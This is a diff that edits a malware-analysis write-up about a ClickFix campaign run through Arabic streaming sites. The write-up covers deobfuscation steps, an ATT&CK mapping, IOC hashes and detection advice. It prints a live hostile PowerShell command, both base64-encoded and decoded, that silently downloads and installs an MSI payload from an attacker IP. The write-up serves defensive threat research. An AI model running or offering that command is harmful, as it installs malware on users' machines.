@@ -472,13 +472,12 @@ Finally, removes the first character `.` and executes the reconstructed command.
 call !Text:~1!
 ```
 
-
-The 2nd stage contains a base64 encoded command:
+After deobfuscation, a base64 encoded command:
 ```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc YwBkACAAJABlAG4AdgA6AFQATQBQADsAaQByAG0AIAAyADUANAA5ADEAMgA3ADEAMwA1AC8AMwAzADMAIAAtAE8AdQB0AEYAaQBsAGUAIAB1AC4AbQBzAGkAOwBtAHMAaQBlAHgAZQBjACAALwBpACAAdQAuAG0AcwBpACAALwBxAG4AIABNAFMASQBJAE4AUwBUAEEATABMAFAARQBSAFUAUwBFAFIAPQAxAA==
 ```
-After decoding the command, the command downloading `u.msi` file from the IP 2549127135
-which can be converted to dotted decimal format to 151\.240\.151\.223.
+After decoding the command, the command downloading `u.msi` file from the decimal IP 2549127135
+which can be converted to dotted decimal format to 151\.240\.151\.223 using [abuseipdb](https://www.abuseipdb.com/tools/ip-address-converter) or cybrchef.
 
 ```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h cd $env:TMP;irm 2549127135/333 -OutFile u.msi;msiexec /i u.msi /qn MSIINSTALLPERUSER=1
@@ -489,6 +488,7 @@ Obfuscated CMD → Character-index reconstruction → String replacement → Sec
 
 
 # MITRE ATT&CK
+
 
 | Tactic               | Tactic ID | Technique                               | Technique ID |
 | -------------------- | --------- | --------------------------------------- | ------------ |
@@ -534,9 +534,11 @@ Obfuscated CMD → Character-index reconstruction → String replacement → Sec
 | Defense Impairment   | TA0112    | Modify Registry                         | T1112        |
 
 
+
 # IOCs
 
 The lists of IOCs (Domains, IPs, and body of pages) are in my [github](https://github.com/muha2xmad/IOCs/tree/main/arabic%20streaming%20clickfix%20campaign).
+
 
 | IOC (Domain or SHA256 Hash)                                        | Category                                                                                                                        |
 | ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
@@ -570,6 +572,8 @@ The lists of IOCs (Domains, IPs, and body of pages) are in my [github](https://g
 | `fb3b51251459108f3337d7ae3e5fad105d35a8956ae05d333b8f128afc451a31` | Extracted [Executable](https://app.any.run/tasks/43a11b7e-d8b9-49b4-8408-02643568f94c/) (`3e1LfPE3k6BR4EZ-ptYKZRR30rMPonL.exe`) |
 | `268ae71bdcefaaa418cb42efcf0f6a3b828e233eca3cb55faa666058d9e6651b` | Dropped Executable (`update-KB4703886.exe`)                                                                                     |
 | `de958b6195ea807ae674b522a907be91331c4d12e564e3a8e8d86d8db64d33cd` | MSI (`u.msi`)                                                                                                                   |
+
+
 # Recommendations
 ## Detection
 Hunt for the PowerShell behaviors associated with this campaign using the [Sigma rules](https://github.com/muha2xmad/Sigma-Rules/tree/main/PS%20streaming%20ClickFix%20%20campaign) referenced in the repository.
